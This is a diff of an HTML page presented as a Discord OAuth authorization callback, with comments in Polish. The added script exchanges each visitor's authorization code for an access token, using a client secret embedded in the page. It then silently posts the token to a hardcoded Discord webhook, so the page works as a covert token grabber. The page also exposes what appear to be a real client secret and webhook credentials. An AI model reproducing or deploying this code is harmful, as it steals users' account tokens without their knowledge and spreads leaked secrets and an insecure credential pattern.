@@ -1,20 +1,62 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Authorization Callback</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Discord Auth Callback</title>
 </head>
 <body>
-    <h1>Authorization Callback</h1>
-    <p>This page is the authorization callback for your application.</p>
-    <p>Code: <span id="code"></span></p>
 
-    <script>
-        // Pobierz kod autoryzacyjny z parametrów URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code');
+<script>
+  // Funkcja do pobierania parametrów URL
+  function getParameterByName(name, url) {
+    if (!url) url = window.location.href;
+    name = name.replace(/[\[\]]/g, "\\$&");
+    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+        results = regex.exec(url);
+    if (!results) return null;
+    if (!results[2]) return '';
+    return decodeURIComponent(results[2].replace(/\+/g, " "));
+  }
 
-        // Wyświetl kod autoryzacyjny na stronie
-        document.getElementById('code').textContent = code;
-    </script>
+  // Pobranie kodu autoryzacyjnego z parametrów URL
+  var code = getParameterByName('code');
+
+  if (code) {
+    // Wymiana kodu autoryzacyjnego na token dostępu
+    fetch('https://discord.com/api/oauth2/token', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+      },
+      body: new URLSearchParams({
+        client_id: '1140982123822583869',
+        client_secret: 'Tli7w7NivUzlasEaMGtDCUZxS2D-nwRr',
+        grant_type: 'authorization_code',
+        code: code,
+        redirect_uri: 'YOUR_REDIRECT_URI',
+        scope: 'identify'  // Zakresy, które wykorzystujesz
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      var accessToken = data.access_token;
+      // Wysłanie tokenu dostępu na webhook
+      fetch('https://discord.com/api/webhooks/1140998814434603128/X6xRfXdDHMFW2B12EJwvs-CYEl2NVEWHzLsz1SIW_7gIjBZKwYRdZXEsg-L2ZSXPtPNl', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          content: `Token dostępu: ${accessToken}`
+        })
+      });
+    })
+    .catch(error => {
+      console.error('Błąd:', error);
+    });
+  }
+</script>
+
 </body>
 </html>
